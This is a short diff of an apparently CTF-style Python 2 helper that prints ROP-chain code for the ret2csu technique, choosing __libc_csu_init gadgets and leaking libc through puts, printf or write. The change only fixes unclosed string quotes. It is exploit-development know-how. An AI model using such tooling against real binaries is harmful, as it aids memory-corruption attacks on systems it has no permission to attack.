@@ -23,7 +23,7 @@ gadget1 = binary.symbols["__libc_csu_init"] + (0x4005EA - 0x400590)
 gadget2 = binary.symbols["__libc_csu_init"] + (0x4005D0 - 0x400590)
 
 if "puts" in binary.got:
-    print "[*] using `puts` to print the leak
+    print "[*] using `puts` to print the leak"
     print
     #r12 = puts@plt
     #rbx = 0
@@ -48,7 +48,7 @@ if "puts" in binary.got:
     print "rop += p64(0) # junk"
     print "rop += p64(0) # junk"
 elif "printf" in binary.got:
-    print "[*] using `printf` to print the leak
+    print "[*] using `printf` to print the leak"
     print
     #r12 = printf@plt
     #rbx = 0
@@ -73,7 +73,7 @@ elif "printf" in binary.got:
     print "rop += p64(0) # junk"
     print "rop += p64(0) # junk"
 elif "write" in binary.got:
-    print "[*] using `write` to print the leak
+    print "[*] using `write` to print the leak"
     print
     #r12 = write@plt
     #rbx = 0
